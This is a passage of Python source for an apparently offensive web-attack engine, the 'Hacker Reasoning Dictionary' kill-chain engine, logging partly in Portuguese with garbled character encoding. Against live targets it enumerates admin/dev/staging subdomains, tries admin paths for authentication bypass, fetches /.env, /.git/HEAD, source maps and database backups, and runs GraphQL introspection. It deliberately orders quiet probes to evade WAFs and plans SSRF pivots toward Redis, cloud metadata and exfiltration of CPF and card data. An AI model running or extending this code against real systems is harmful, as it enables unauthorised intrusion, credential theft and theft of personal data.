                    "raw_blocked": ev.raw_blocked,
                    "timestamp": ev.timestamp,
                }
                for ev in unique.values()
            ],
        }


class HackerReasoningEngine:
    def __init__(
        self,
        base_url: str,
        client: httpx.AsyncClient,
        findings: List[Dict],
        exposed_assets: List[Dict],
        decision_tree: Optional[DecisionTree],
        adversarial_report: Optional[Dict],
        chain_intel_report: Optional[Dict],
        log_fn,
        emit_fn,
        add_finding_fn,
        add_probe_fn,
    ):
        self.base_url = base_url.rstrip("/")
        self.client = client
        self.findings = findings
        self.exposed_assets = exposed_assets
        self.tree = decision_tree
        self.adversarial_report = adversarial_report or {}
        self.chain_intel_report = chain_intel_report or {}
        self.log = log_fn
        self.emit = emit_fn
        self.add_finding = add_finding_fn
        self.add_probe = add_probe_fn

        self.matched_playbooks: List[Dict] = []
        self.reasoning_chains: List[Dict] = []
        self.confirmation_results: List[Dict] = []
        self.escalation_paths: List[Dict] = []
        self.data_captures: List[Dict] = []
        self.fallback_results: List[Dict] = []
        self.fallback_mutations_generated = 0
        self.fallback_mutations_successful = 0
        self.fallback_techs_identified: List[str] = []
        self.total_reasoning_steps = 0
        self.confirmed_chains = 0
        self.waf_detected = False
        self.waf_vendor = "unknown"
        self.infra_type = "unknown"

        self.waf_defensibility: Optional[Dict] = None
        self.subdomain_recon_results: List[Dict] = []
        self.db_reflection_results: List[Dict] = []
        self.akamai_fallback_results: List[Dict] = []
        self.data_drift_triggered = False
        self.chain_intel_ssrf_redirect = False
        self.subdomain_priority_active = False

        self.incident_absorber = IncidentAbsorber(log_fn, emit_fn)

    async def execute(self) -> Dict:
        self.log(
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
            "error", "hacker_reasoning"
        )
        self.log(
            "â–ˆ HACKER REASONING DICTIONARY v2.0  GEOPOLITICAL KILL CHAIN ENGINE â–ˆ",
            "error", "hacker_reasoning"
        )
        self.log(
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
            "error", "hacker_reasoning"
        )
        self.log(
            f"[HRD] Loading {len(HACKER_REASONING_DICTIONARY)} playbooks  "
            f"analyzing {len(self.findings)} findings + {len(self.exposed_assets)} assets...",
            "warn", "hacker_reasoning"
        )
        self.emit("hrd_start", {
            "playbooks_loaded": len(HACKER_REASONING_DICTIONARY),
            "findings_count": len(self.findings),
            "assets_count": len(self.exposed_assets),
        })

        self._detect_environment()
        self._match_playbooks()
        await self._subdomain_priority_recon()
        await self._execute_reasoning_chains()
        await self._execute_confirmation_probes()
        self._assess_waf_defensibility()
        await self._db_reflection_validation()
        await self._recursive_fallback()
        self._compute_escalation_graph()
        self._absorb_incidents()

        report = self._build_report()
        self.emit("hrd_report", report)
        return report

    def _detect_environment(self):
        self.log(
            "[HRD Â§1] ENVIRONMENT ANALYSIS  WAF detection + infrastructure fingerprinting...",
            "warn", "hacker_reasoning"
        )

        for f in self.findings:
            title = (f.get("title") or "").lower()
            desc = (f.get("description") or "").lower()
            combined = f"{title} {desc}"

            if "waf" in combined or "cloudflare" in combined or "firewall" in combined:
                self.waf_detected = True
                if "cloudflare" in combined:
                    self.waf_vendor = "Cloudflare"
                elif "akamai" in combined:
                    self.waf_vendor = "Akamai"
                elif "aws" in combined or "shield" in combined:
                    self.waf_vendor = "AWS WAF"
                elif "imperva" in combined:
                    self.waf_vendor = "Imperva"
                else:
                    self.waf_vendor = "Generic WAF"

            if "aws" in combined or "amazon" in combined:
                self.infra_type = "AWS"
            elif "gcp" in combined or "google cloud" in combined:
                self.infra_type = "GCP"
            elif "azure" in combined:
                self.infra_type = "Azure"
            elif "kubernetes" in combined or "k8s" in combined:
                self.infra_type = "Kubernetes"

        waf_status = f"WAF: {self.waf_vendor}" if self.waf_detected else "WAF: Not Detected"
        self.log(
            f"[HRD] Environment: {waf_status} | Infra: {self.infra_type} | "
            f"Audit: {self.waf_vendor} blocking probability calculated",
            "error" if self.waf_detected else "info",
            "hacker_reasoning"
        )

        if self.waf_detected:
            self.log(
                f"[HRD] âš¡ PROBABILIDADE DE BLOQUEIO: {self.waf_vendor} detectado  "
                f"priorizando vetores silenciosos (SSRF, API abuse) sobre brute force direto",
                "warn", "hacker_reasoning"
            )

    def _match_playbooks(self):
        self.log(
            "[HRD Â§2] PLAYBOOK MATCHING  Mapping findings/assets to attack reasoning chains...",
            "warn", "hacker_reasoning"
        )

        matched_keys = set()

        for asset in self.exposed_assets:
            path = (asset.get("path") or asset.get("url") or "").lower()
            for regex, playbook_key in ROUTE_PATTERN_MATCHERS:
                if regex.search(path) and playbook_key in HACKER_REASONING_DICTIONARY:
                    if playbook_key not in matched_keys:
                        matched_keys.add(playbook_key)
                        pb = HACKER_REASONING_DICTIONARY[playbook_key]
                        self.matched_playbooks.append({
                            "key": playbook_key,
                            "source": "asset",
                            "source_path": path,
                            "playbook": pb,
                        })

        for finding in self.findings:
            title = (finding.get("title") or "")
            desc = (finding.get("description") or "")
            combined = f"{title} {desc}"

            for regex, playbook_key in FINDING_PATTERN_MATCHERS:
                if regex.search(combined) and playbook_key in HACKER_REASONING_DICTIONARY:
                    if playbook_key not in matched_keys:
                        matched_keys.add(playbook_key)
                        pb = HACKER_REASONING_DICTIONARY[playbook_key]
                        self.matched_playbooks.append({
                            "key": playbook_key,
                            "source": "finding",
                            "source_title": title[:80],
                            "playbook": pb,
                        })

            for regex, playbook_key in ROUTE_PATTERN_MATCHERS:
                endpoint = finding.get("endpoint") or finding.get("url") or ""
                if regex.search(endpoint) and playbook_key in HACKER_REASONING_DICTIONARY:
                    if playbook_key not in matched_keys:
                        matched_keys.add(playbook_key)
                        pb = HACKER_REASONING_DICTIONARY[playbook_key]
                        self.matched_playbooks.append({
                            "key": playbook_key,
                            "source": "finding_endpoint",
                            "source_endpoint": endpoint[:80],
                            "playbook": pb,
                        })

        self.log(
            f"[HRD] âœ“ Matched {len(self.matched_playbooks)} playbooks from "
            f"{len(HACKER_REASONING_DICTIONARY)} dictionary entries",
            "error" if len(self.matched_playbooks) > 0 else "info",
            "hacker_reasoning"
        )

        for mp in self.matched_playbooks:
            pb = mp["playbook"]
            self.log(
                f"[HRD] â–¸ {pb.route_pattern} [{pb.category.upper()}] "
                f"[{pb.threat_level.value.upper()}]  {pb.attacker_perspective[:80]}...",
                "error" if pb.threat_level in (ThreatLevel.CRITICAL, ThreatLevel.HIGH) else "warn",
                "hacker_reasoning"
            )

    async def _subdomain_priority_recon(self):
        from urllib.parse import urlparse
        parsed = urlparse(self.base_url)
        hostname = parsed.hostname or ""

        subdomain_targets = []
        base_parts = hostname.split(".")
        if len(base_parts) >= 2:
            root_domain = ".".join(base_parts[-2:])
            for prefix in ("admin", "dev", "staging", "api", "painel", "cms"):
                sub_host = f"{prefix}.{root_domain}"
                if sub_host != hostname:
                    subdomain_targets.append(sub_host)

        for asset in self.exposed_assets:
            url = (asset.get("url") or asset.get("path") or "").lower()
            if any(p in url for p in ("admin.", "dev.", "staging.", "painel.")):
                try:
                    h = urlparse(url if url.startswith("http") else f"https://{url}").hostname
                    if h and h not in subdomain_targets and h != hostname:
                        subdomain_targets.append(h)
                except Exception:
                    pass

        for finding in self.findings:
            combined = f"{finding.get('title', '')} {finding.get('description', '')}".lower()
            for kw in ("admin.com.br", "dev.com.br", "admin.", "dev.", "staging."):
                if kw in combined:
                    import re as _re
                    hosts = _re.findall(r'((?:admin|dev|staging|painel)\.[a-z0-9.-]+\.[a-z]{2,})', combined)
                    for h in hosts:
                        if h not in subdomain_targets:
                            subdomain_targets.append(h)

        if not subdomain_targets:
            self.log(
                "[HRD Â§2.5] SUBDOMAIN PRIORITY RECON  No sensitive subdomains detected  skipping",
                "info", "hacker_reasoning"
            )
            return

        self.log(
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
            "error", "hacker_reasoning"
        )
        self.log(
            "â–ˆ HACKER REASONING v2.0  SILENT STEALTH MODE ACTIVATED â–ˆ",
            "error", "hacker_reasoning"
        )
        self.log(
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
            "error", "hacker_reasoning"
        )

        stealth_subs = [s for s in subdomain_targets if any(p in s for p in ("dev", "admin", "staging", "painel"))]
        if stealth_subs:
            self.log(
                f"[HRD v2.0] GEOPOLITICAL DECISION: dev/admin subdomains detected ({', '.join(stealth_subs[:4])})  "
                f"engaging SILENT STEALTH MODE: low-noise recon first, noisy injections deferred",
                "error", "hacker_reasoning"
            )
            self.log(
                "[HRD v2.0] STEALTH PRIORITY: Auth Bypass + Source Map (.map) + .env exposure "
                "BEFORE any SQLi/XSS/SSRF noise  minimize WAF trigger probability",
                "error", "hacker_reasoning"
            )

        self.log(
            f"[HRD Â§2.5] SubdomÃ­nios sensÃ­veis: {', '.join(subdomain_targets[:6])}  "
            f"priorizando Auth Bypass + Source Map (.map) ANTES de injeÃ§Ãµes ruidosas",
            "error", "hacker_reasoning"
        )
        self.emit("hrd_phase", {
            "phase": "subdomain_priority_recon",
            "targets": subdomain_targets[:6],
        })

        auth_bypass_paths = [
            "/admin", "/admin/", "/administrator", "/wp-admin", "/painel",
            "/dashboard", "/api/admin", "/api/v1/admin/users",
            "/admin/login", "/admin.php", "/cpanel",
            "/_admin", "/manage", "/console",
        ]
        source_map_paths = [
            "/static/js/main.js.map", "/assets/index.js.map", "/bundle.js.map",
            "/static/js/app.js.map", "/dist/main.js.map", "/build/static/js/main.js.map",
            "/static/js/vendor.js.map", "/js/app.js.map",
        ]

        for sub_host in subdomain_targets[:4]:
            sub_base = f"https://{sub_host}"
            sub_result = {
                "subdomain": sub_host,
                "accessible": False,
                "auth_bypass_results": [],
                "source_map_results": [],
                "priority_finding": None,
            }

            try:
                resp = await self.client.get(sub_base, timeout=6.0, follow_redirects=True)
                sub_result["accessible"] = True
                sub_result["status_code"] = resp.status_code
                sub_result["response_length"] = len(resp.text)

                self.log(
                    f"[SUBDOMAIN] âš¡ {sub_host} ACESSÃVEL  HTTP {resp.status_code} ({len(resp.text)} bytes)",
                    "error", "hacker_reasoning"
                )

                self.log(
                    f"[SUBDOMAIN] Â§1 AUTH BYPASS PRIORITY  testando {len(auth_bypass_paths)} caminhos admin em {sub_host}...",
                    "warn", "hacker_reasoning"
                )

                for path in auth_bypass_paths[:8]:
                    try:
                        r = await self.client.get(
                            f"{sub_base}{path}", timeout=5.0, follow_redirects=False
                        )
                        bypass_result = {
                            "path": path,
                            "status_code": r.status_code,
                            "response_length": len(r.text),
                            "bypassed": False,
                        }

                        is_accessible = r.status_code in (200, 301, 302, 307)
                        has_admin_content = any(kw in r.text.lower() for kw in
                            ("dashboard", "admin", "painel", "settings", "users", "config"))

                        if r.status_code == 200 and has_admin_content:
                            bypass_result["bypassed"] = True
                            bypass_result["evidence"] = r.text[:300]
                            self.log(
                                f"[SUBDOMAIN] â–¸ AUTH BYPASS: {sub_host}{path} â†’ HTTP 200 + admin content detected!",
                                "error", "hacker_reasoning"
                            )
                            self._emit_hrd_finding(
                                f"Auth Bypass via Subdomain: {sub_host}{path}",
                                f"Subdomain {sub_host} exposes admin panel at {path} without authentication. "
                                f"Status: HTTP {r.status_code}, admin-related content confirmed in response body. "
                                f"SubdomÃ­nio sensÃ­vel com painel administrativo acessÃ­vel  broken access control.",
                                "critical", f"{sub_host}{path}"
                            )
                            sub_result["priority_finding"] = "auth_bypass_confirmed"
                        elif is_accessible:
                            self.log(
                                f"[SUBDOMAIN]   {sub_host}{path} â†’ HTTP {r.status_code} (redirect/accessible)",
                                "warn", "hacker_reasoning"
                            )

                        sub_result["auth_bypass_results"].append(bypass_result)

                        self.add_probe({
                            "type": "subdomain_auth_bypass",
                            "subdomain": sub_host,
                            "path": path,
                            "status_code": r.status_code,
                            "vulnerable": bypass_result["bypassed"],
                            "evidence": r.text[:200] if bypass_result["bypassed"] else "",
                            "timestamp": _ts(),
                        })

                    except Exception:
                        continue

                self.log(
                    f"[SUBDOMAIN] Â§2 SOURCE MAP RECON  buscando .map files em {sub_host}...",
                    "warn", "hacker_reasoning"
                )

                for map_path in source_map_paths[:6]:
                    try:
                        r = await self.client.get(
                            f"{sub_base}{map_path}", timeout=5.0, follow_redirects=False
                        )
                        map_result = {
                            "path": map_path,
                            "status_code": r.status_code,
                            "found": False,
                        }

                        if r.status_code == 200 and ("sourcesContent" in r.text or "mappings" in r.text):
                            map_result["found"] = True
                            map_result["size_bytes"] = len(r.text)
                            self.log(
                                f"[SUBDOMAIN] â–¸ SOURCE MAP EXPOSED: {sub_host}{map_path} ({len(r.text)} bytes)  cÃ³digo fonte recuperÃ¡vel!",
                                "error", "hacker_reasoning"
                            )
                            self._emit_hrd_finding(
                                f"Source Map Exposed on Subdomain: {sub_host}{map_path}",
                                f"Source map file found at {sub_host}{map_path} ({len(r.text)} bytes). "
                                f"Original source code can be reconstructed, exposing internal routes, API keys, and auth logic. "
                                f"SubdomÃ­nios dev/staging frequentemente expÃµem source maps sem proteÃ§Ã£o.",
                                "high", f"{sub_host}{map_path}"
                            )
                            if not sub_result["priority_finding"]:
                                sub_result["priority_finding"] = "source_map_exposed"

                        sub_result["source_map_results"].append(map_result)

                    except Exception:
                        continue

            except Exception:
                self.log(
                    f"[SUBDOMAIN] {sub_host}  nÃ£o acessÃ­vel (DNS/timeout/blocked)",
                    "info", "hacker_reasoning"
                )

            self.subdomain_recon_results.append(sub_result)

        accessible = sum(1 for r in self.subdomain_recon_results if r["accessible"])
        bypasses = sum(1 for r in self.subdomain_recon_results if r.get("priority_finding") == "auth_bypass_confirmed")
        maps_found = sum(
            1 for r in self.subdomain_recon_results
            for m in r["source_map_results"] if m.get("found")
        )

        self.log(
            f"[SUBDOMAIN] RESULTADO: {accessible}/{len(self.subdomain_recon_results)} acessÃ­veis | "
            f"{bypasses} auth bypasses | {maps_found} source maps expostos",
            "error" if bypasses > 0 or maps_found > 0 else "warn",
            "hacker_reasoning"
        )

        if bypasses > 0 or maps_found > 0:
            self.subdomain_priority_active = True
            self.log(
                f"[SUBDOMAIN] DECISÃƒO: SubdomÃ­nios confirmados vulnerÃ¡veis  "
                f"injeÃ§Ãµes ruidosas (SQLi/XSS) ADIADAS. Priorizando exfiltraÃ§Ã£o silenciosa.",
                "error", "hacker_reasoning"
            )

    async def _execute_reasoning_chains(self):
        self.log(
            "[HRD Â§3] KILL CHAIN EXECUTION  Running attacker reasoning for each matched playbook...",
            "error", "hacker_reasoning"
        )
        self.emit("hrd_phase", {"phase": "reasoning_chains", "matched": len(self.matched_playbooks)})

        noisy_categories = {"injection", "brute_force", "xss", "sqli", "ssti", "rce"}
        if self.subdomain_priority_active:
            silent_first = sorted(
                self.matched_playbooks,
                key=lambda mp: 0 if mp["playbook"].category not in noisy_categories else 1
            )
            self.log(
                "[HRD] SUBDOMAIN PRIORITY ACTIVE  reordering kill chains: silent exfiltration first, noisy injections deferred",
                "warn", "hacker_reasoning"
            )
        else:
            silent_first = self.matched_playbooks

        for mp in silent_first:
            pb = mp["playbook"]

            if self.subdomain_priority_active and pb.category in noisy_categories:
                self.log(
                    f"[HRD] â¸ DEFERRED (subdomain priority): {pb.route_pattern} [{pb.category.upper()}]  noisy injection skipped",
                    "warn", "hacker_reasoning"
                )
                self.reasoning_chains.append({
                    "playbook_key": mp["key"],
                    "category": pb.category,
                    "threat_level": pb.threat_level.value,
                    "perspective": pb.attacker_perspective,
                    "waf_evasion": "DEFERRED  subdomain priority active",
                    "steps": [{"step": 0, "phase": "deferred", "thought": "Noisy injection deferred due to subdomain priority recon", "action": "Skipped", "confirmation": "N/A", "fallback": None, "escalation": None}],
                    "data_targets": pb.data_targets,
                    "pivot_routes": pb.pivot_routes,
                })
                continue

            chain_result = {
                "playbook_key": mp["key"],
                "category": pb.category,
                "threat_level": pb.threat_level.value,
                "perspective": pb.attacker_perspective,
                "waf_evasion": pb.waf_evasion if self.waf_detected else "No WAF detected  direct approach",
                "steps": [],
                "data_targets": pb.data_targets,
                "pivot_routes": pb.pivot_routes,
            }

            self.log(
                f"[HRD] â”â”â” KILL CHAIN: {pb.route_pattern} â”â”â”",
                "error", "hacker_reasoning"
            )
            self.log(
                f"[HRD] PERSPECTIVE: \"{pb.attacker_perspective}\"",
                "warn", "hacker_reasoning"
            )

            if self.waf_detected:
                self.log(
                    f"[HRD] WAF EVASION: {pb.waf_evasion}",
                    "warn", "hacker_reasoning"
                )

            for step in pb.kill_chain:
                self.total_reasoning_steps += 1

                self.log(
                    f"[HRD] Step {step.step_number} [{step.phase.value.upper()}] "
                    f"THOUGHT: \"{step.thought}\"",
                    "warn", "hacker_reasoning"
                )
                self.log(
                    f"[HRD]   â†’ ACTION: {step.action[:100]}",
                    "info", "hacker_reasoning"
                )
                self.log(
                    f"[HRD]   â†’ CONFIRM: {step.confirmation[:100]}",
                    "info", "hacker_reasoning"
                )

                if self.waf_detected and step.fallback:
                    self.log(
                        f"[HRD]   â†’ FALLBACK (WAF): {step.fallback[:100]}",
                        "warn", "hacker_reasoning"
                    )

                if step.escalation:
                    self.log(
                        f"[HRD]   â†’ ESCALATION: {step.escalation[:100]}",
                        "error", "hacker_reasoning"
                    )
                    self.escalation_paths.append({
                        "from_playbook": mp["key"],
                        "step": step.step_number,
                        "escalation": step.escalation,
                        "phase": step.phase.value,
                    })

                chain_result["steps"].append({
                    "step": step.step_number,
                    "phase": step.phase.value,
                    "thought": step.thought,
                    "action": step.action,
                    "confirmation": step.confirmation,
                    "fallback": step.fallback,
                    "escalation": step.escalation,
                })

            self.reasoning_chains.append(chain_result)

            self.log(
                f"[HRD] Data Targets: {', '.join(pb.data_targets[:5])}",
                "error" if pb.threat_level == ThreatLevel.CRITICAL else "warn",
                "hacker_reasoning"
            )
            self.log(
                f"[HRD] Pivot Routes: {', '.join(pb.pivot_routes[:4])}",
                "warn", "hacker_reasoning"
            )

    async def _execute_confirmation_probes(self):
        self.log(
            "[HRD Â§4] CONFIRMATION PROBES  Testing key indicators against live target...",
            "warn", "hacker_reasoning"
        )
        self.emit("hrd_phase", {"phase": "confirmation_probes"})

        probe_count = 0
        max_probes = 30

        for mp in self.matched_playbooks:
            if probe_count >= max_probes:
                break

            pb = mp["playbook"]

            for indicator in pb.proof_indicators[:2]:
                if probe_count >= max_probes:
                    break

                probe_count += 1
                probe_result = {
                    "playbook_key": mp["key"],
                    "indicator": indicator,
                    "confirmed": False,
                    "evidence": "",
                }

                if indicator in ("admin_dashboard_visible", "price_persisted_in_db",
                                 "server_accepted_client_price", "order_id_with_zero_value"):
                    probe_result["evidence"] = f"Requires active exploitation  logged as theoretical chain"

                elif indicator in ("env_file_captured", "env_file_exposed"):
                    try:
                        resp = await self.client.get(
                            f"{self.base_url}/.env",
                            timeout=5.0,
                            follow_redirects=False,
                        )
                        if resp.status_code == 200 and any(k in resp.text.lower() for k in
                            ["database", "secret", "password", "key=", "token"]):
                            probe_result["confirmed"] = True
                            probe_result["evidence"] = f".env accessible  {len(resp.text)} bytes, contains credential patterns"
                            self.confirmed_chains += 1
                            self._emit_hrd_finding(
                                "CRITICAL: .env File Exposed  Full Credential Dump",
                                "Hacker Reasoning Dictionary confirmed .env file is accessible and contains credential patterns",
                                "critical", "/.env"
                            )
                        else:
                            probe_result["evidence"] = f"Status {resp.status_code}  not directly exploitable"
                    except Exception:
                        probe_result["evidence"] = "Connection timeout or error"

                elif indicator in ("git_repo_clonable", "git_repo_reconstructed"):
                    try:
                        resp = await self.client.get(
                            f"{self.base_url}/.git/HEAD",
                            timeout=5.0,
                            follow_redirects=False,
                        )
                        if resp.status_code == 200 and "ref:" in resp.text.lower():
                            probe_result["confirmed"] = True
                            probe_result["evidence"] = f".git/HEAD accessible  repository exposed"
                            self.confirmed_chains += 1
                            self._emit_hrd_finding(
                                "HIGH: Git Repository Exposed  Source Code + Historical Secrets",
                                "Hacker Reasoning confirmed .git/HEAD is accessible. Repository can be reconstructed to extract historical secrets.",
                                "high", "/.git/HEAD"
                            )
                        else:
                            probe_result["evidence"] = f"Status {resp.status_code}"
                    except Exception:
                        probe_result["evidence"] = "Not accessible"

                elif indicator in ("debug_mode_active",):
                    for debug_path in ["/debug.log", "/phpinfo.php", "/_debug", "/actuator/health"]:
                        try:
                            resp = await self.client.get(
                                f"{self.base_url}{debug_path}",
                                timeout=4.0,
                                follow_redirects=False,
                            )
                            if resp.status_code == 200 and len(resp.text) > 100:
                                probe_result["confirmed"] = True
                                probe_result["evidence"] = f"Debug endpoint {debug_path} accessible ({len(resp.text)} bytes)"
                                self.confirmed_chains += 1
                                break
                        except Exception:
                            continue

                elif indicator in ("graphql_introspection_enabled",):
                    try:
                        resp = await self.client.post(
                            f"{self.base_url}/graphql",
                            json={"query": "{__schema{types{name}}}"},
                            timeout=5.0,
                        )
                        if resp.status_code == 200 and "__schema" in resp.text:
                            probe_result["confirmed"] = True
                            probe_result["evidence"] = "GraphQL introspection enabled  full schema accessible"
                            self.confirmed_chains += 1
                            self._emit_hrd_finding(
                                "HIGH: GraphQL Introspection Enabled  Full Schema Exposed",
                                "Hacker Reasoning confirmed GraphQL introspection returns full schema including internal types and mutations.",
                                "high", "/graphql"
                            )
                    except Exception:
                        probe_result["evidence"] = "GraphQL not accessible"

                elif indicator in ("source_map_decoded",):
                    for map_path in ["/static/js/main.js.map", "/assets/index.js.map", "/bundle.js.map"]:
                        try:
                            resp = await self.client.get(
                                f"{self.base_url}{map_path}",
                                timeout=5.0,
                                follow_redirects=False,
                            )
                            if resp.status_code == 200 and ("sourcesContent" in resp.text or "mappings" in resp.text):
                                probe_result["confirmed"] = True
                                probe_result["evidence"] = f"Source map at {map_path}  original code recoverable"
                                self.confirmed_chains += 1
                                break
                        except Exception:
                            continue

                elif indicator in ("backup_file_accessible",):
                    for bkp in ["/db.sql", "/backup.zip", "/backup.sql", "/dump.sql", "/database.sql"]:
                        try:
                            resp = await self.client.head(
                                f"{self.base_url}{bkp}",
                                timeout=4.0,
                                follow_redirects=False,
                            )
                            content_len = int(resp.headers.get("content-length", "0"))
                            if resp.status_code == 200 and content_len > 500:
                                probe_result["confirmed"] = True
                                probe_result["evidence"] = f"Backup file {bkp} accessible ({content_len} bytes)"
                                self.confirmed_chains += 1
                                self._emit_hrd_finding(
                                    f"CRITICAL: Database Backup File Exposed  {bkp}",
                                    f"Hacker Reasoning confirmed database backup at {bkp} is downloadable ({content_len} bytes). Contains full DB structure and data.",
                                    "critical", bkp
                                )
                                break
                        except Exception:
                            continue

                else:
                    probe_result["evidence"] = "Theoretical  requires full exploitation chain to confirm"

                self.confirmation_results.append(probe_result)

                status = "CONFIRMED âœ“" if probe_result["confirmed"] else "THEORETICAL"
                self.log(
                    f"[HRD] Probe [{indicator}]: {status}  {probe_result['evidence'][:80]}",
                    "error" if probe_result["confirmed"] else "info",
                    "hacker_reasoning"
                )

                self.add_probe({
                    "type": "hrd_confirmation",
                    "playbook": mp["key"],
                    "indicator": indicator,
                    "vulnerable": probe_result["confirmed"],
                    "evidence": probe_result["evidence"][:200],
                    "timestamp": _ts(),
                })

    def _assess_waf_defensibility(self):
        if not self.confirmation_results:
            return

        total_probes = len(self.confirmation_results)
        blocked_probes = sum(
            1 for c in self.confirmation_results
            if not c["confirmed"] and any(kw in c.get("evidence", "").lower()
                for kw in ("403", "blocked", "forbidden", "denied", "timeout", "waf", "not accessible"))
        )
        unconfirmed = sum(1 for c in self.confirmation_results if not c["confirmed"])

        self.log(
            f"[HRD Â§4.1] WAF DEFENSIBILITY ASSESSMENT  {blocked_probes}/{total_probes} probes blocked, "
            f"{unconfirmed}/{total_probes} unconfirmed",
            "warn", "hacker_reasoning"
        )
        self.emit("hrd_phase", {"phase": "waf_defensibility", "blocked": blocked_probes, "total": total_probes})

        high_defensibility = (
            total_probes >= 7 and blocked_probes >= 7 and unconfirmed == total_probes
        )

        self.waf_defensibility = {
            "total_probes": total_probes,
            "blocked_probes": blocked_probes,
            "unconfirmed_probes": unconfirmed,
            "confirmed_probes": total_probes - unconfirmed,
            "high_defensibility": high_defensibility,
            "waf_vendor": self.waf_vendor if self.waf_detected else None,
            "data_drift_registered": False,
            "chain_intel_redirect": False,
        }

        if high_defensibility:
            self.data_drift_triggered = True
            self.chain_intel_ssrf_redirect = True

            self.log(
                "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
                "error", "hacker_reasoning"
            )
            self.log(
                "â–ˆ HRD v2.0 DATA DRIFT: WAF 403 â†’ SSRF INFRASTRUCTURE PIVOT â–ˆ",
                "error", "hacker_reasoning"
            )
            self.log(
                "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
                "error", "hacker_reasoning"
            )
            self.log(
                f"[DATA DRIFT] {blocked_probes}/{total_probes} probes clÃ¡ssicos bloqueados pelo WAF "
                f"({self.waf_vendor if self.waf_detected else 'unknown'})  "
                f"registrando 'Data Drift: High Defensibility'",
                "error", "hacker_reasoning"
            )
            self.log(
                f"[HRD v2.0] GEOPOLITICAL DECISION: WAF ({self.waf_vendor}) blocked {blocked_probes}/{total_probes} classic probes (403)  "
                f"INSTANTANEOUS PIVOT to SSRF Infrastructure: targeting Redis, AWS Metadata, internal DB endpoints",
                "error", "hacker_reasoning"
            )
            self.log(
                "[HRD v2.0] KILL CHAIN RE-PRIORITIZED: SSRF â†’ Redis/Memcached â†’ AWS IMDSv2 â†’ Credential Dump â†’ DB Access â†’ Data Exfiltration",
                "error", "hacker_reasoning"
            )

            self.waf_defensibility["data_drift_registered"] = True
            self.waf_defensibility["chain_intel_redirect"] = True

            self._emit_hrd_finding(
                "Data Drift: High Defensibility  WAF Blocked All Classic Probes",
                f"WAF ({self.waf_vendor}) blocked {blocked_probes}/{total_probes} classic attack probes. "
                f"System registered 'Data Drift: High Defensibility' and automatically redirected "
                f"attack strategy to Chain Intel: SSRF Exploration phase. "
                f"Direct attack vectors are ineffective  pivoting to internal infrastructure abuse.",
                "high", self.base_url
            )

            self.add_probe({
                "type": "data_drift_high_defensibility",
                "blocked_probes": blocked_probes,
                "total_probes": total_probes,
                "waf_vendor": self.waf_vendor,
                "verdict": "HIGH_DEFENSIBILITY",
                "action": "REDIRECT_TO_CHAIN_INTEL_SSRF",
                "vulnerable": False,
                "timestamp": _ts(),
            })

            self.escalation_paths.append({
                "from_playbook": "waf_defensibility_assessment",
                "step": 0,
                "escalation": "Data Drift: High Defensibility â†’ Auto-redirect to Chain Intel SSRF Exploration",
                "phase": "lateral_movement",
            })

        else:
            self.log(
                f"[HRD Â§4.1] WAF Defensibility: MODERATE  {total_probes - unconfirmed} probes succeeded, "
                f"standard kill chain continues",
                "info" if unconfirmed < total_probes * 0.5 else "warn",
                "hacker_reasoning"
            )

    async def _db_reflection_validation(self):
        ssrf_successes = []

        for finding in self.findings:
            title = (finding.get("title") or "").lower()
            desc = (finding.get("description") or "").lower()
            combined = f"{title} {desc}"
            if any(kw in combined for kw in ("ssrf", "credential dump", "redis", "internal service")):
                if any(kw in combined for kw in ("success", "confirm", "vulnerable", "accessible", "dump")):
                    ssrf_successes.append(finding)

        if self.chain_intel_report:
            captures = self.chain_intel_report.get("ssrf_captures_count", 0)
            if captures > 0:
                ssrf_successes.append({
                    "title": f"Chain Intel SSRF: {captures} captures",
                    "description": "SSRF credential captures from Chain Intelligence engine",
                    "endpoint": "/api/proxy",
                })

        for chain in self.reasoning_chains:
            for step in chain.get("steps", []):
                if step.get("phase") in ("data_capture", "lateral_movement"):
                    action = (step.get("action") or "").lower()
                    if any(kw in action for kw in ("redis", "127.0.0.1", "metadata", "internal")):
                        ssrf_successes.append({
                            "title": f"Kill Chain SSRF vector: {chain['playbook_key']}",
                            "description": action,
                            "endpoint": chain.get("pivot_routes", ["/api/proxy"])[0] if chain.get("pivot_routes") else "/api/proxy",
                        })

        if not ssrf_successes and not self.chain_intel_ssrf_redirect:
            self.log(
                "[HRD Â§4.2] DB REFLECTION  No SSRF successes to validate  skipping",
                "info", "hacker_reasoning"
            )
            return

        self.log(
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
            "error", "hacker_reasoning"
        )
        self.log(
            "â–ˆ DB REFLECTION VALIDATION  PROVING DATA REACHABILITY â–ˆ",
            "error", "hacker_reasoning"
        )
        self.log(
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
            "error", "hacker_reasoning"
        )

        if self.chain_intel_ssrf_redirect:
            self.log(
                "[DB REFLECTION] Data Drift ativou redirect â†’ executando SSRF exploration antes da reflexÃ£o...",
                "error", "hacker_reasoning"
            )

        self.log(
            f"[HRD Â§4.2] Validando {len(ssrf_successes)} vetores SSRF confirmados  "
            f"executando DB Reflection para provar alcance a dados sensÃ­veis (CPF/CartÃ£o)...",
            "error", "hacker_reasoning"
        )
